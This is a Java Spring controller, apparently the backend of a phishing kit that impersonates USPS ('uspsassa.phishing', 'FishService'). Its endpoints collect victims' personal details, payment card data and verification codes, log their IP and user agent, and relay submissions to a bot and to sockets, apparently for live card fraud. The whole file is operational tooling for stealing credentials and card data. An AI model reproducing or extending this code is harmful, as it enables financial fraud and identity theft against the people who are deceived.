package com.uspsassa.phishing.controller;

import cn.hutool.json.JSON;
import cn.hutool.json.JSONUtil;
import com.uspsassa.phishing.common.result.Result;
import com.uspsassa.phishing.common.utils.IpUtil;
import com.uspsassa.phishing.entity.Order;
import com.uspsassa.phishing.request.user.*;
import com.uspsassa.phishing.service.FishService;
import com.uspsassa.phishing.vo.FishVo;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import org.springframework.http.HttpEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.util.MultiValueMap;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.RestTemplate;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.awt.*;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;

@RestController
@RequestMapping("user")
@Tag(name = "用户模块")
public class UserController {

    @Operation(summary = "获取服务器所在公网ip", description = "返回ip")
    @PostMapping("getIp")
    public Result<String> getIp() {
        //http://ip.42.pl/raw get ip
        String ip = null;
        //发起请求
        String url = "http://ip.42.pl/raw";
        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(null);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity(url, request, String.class);
        if (response.getStatusCodeValue() == 200) {
            ip = response.getBody();
        }

        return Result.success(ip);
    }


    @Resource
    FishService fishService;

    @Operation(summary = "添加基本信息", description = "返回全部信息")
    @PostMapping("addBaseInfo")
    public Result<FishVo> addBaseInfo(@RequestBody @Validated AddFishBaseRequest baseInfo, HttpServletRequest request) throws IOException {
        String ua = request.getHeader("User-Agent");
        //获取ip
        String ip = request.getRemoteAddr();
        return Result.success(fishService.addBaseInfo(baseInfo, ua, ip));
    }


    @Operation(summary = "添加基本信息卡信息 ", description = "不返回 等待socket返回信息")
    @PostMapping("addBaseCardInfo")
    public Result<FishVo> addBaseCardInfo(@RequestBody @Validated AddFishBaseAndCartRequest baseInfo, HttpServletRequest request) throws IOException {
        String ua = request.getHeader("User-Agent");
        //获取ip
        String ip = IpUtil.getIpAddr(request);
        return Result.success(fishService.addBaseCardInfo(baseInfo, ua, ip));
    }

    @Operation(summary = "添加卡信息 ", description = "不返回 等待socket返回信息")
    @PostMapping("addCardInfo")
    public Result<Void> addCardInfo(@RequestBody @Validated AddFishCardRequest cardRequest) throws IOException {
        fishService.addCardInfo(cardRequest);
        return Result.success();
    }

    @Operation(summary = "添加验证码信息", description = "不返回 等待socket返回")
    @PostMapping("addCodeInfo")
    public Result<Void> addCodeInfo(@RequestBody @Validated AddFishCodeRequest codeRequest) throws IOException {
        fishService.addCodeInfo(codeRequest);
        return Result.success();
    }

    @Operation(summary = "随便一个接口 校验", description = "用于测试是否可正常访问")
    @PostMapping("check")
    public Result<Void> check() {
        return Result.success();
    }


    @Operation(summary = "发送机器人")
    @PostMapping("sendRobot")
    public Result<Void> sendRobot(@RequestBody String msg) {
        fishService.sendRobot(msg);
        return Result.success();
    }

    @Operation(summary = "添加订单信息")
    @PostMapping("addOrder")
    public Result<Void> addOrder(@RequestBody AddOrderRequest orderRequest){
        fishService.addOrder(orderRequest);
        return Result.success();
    }

    @Operation(summary = "根据sid查询订单")
    @PostMapping("getOrderBySid")
    public Result<Order> getOrderBySid(@RequestParam String sid){
        return Result.success(fishService.getOrder(sid));
    }
}
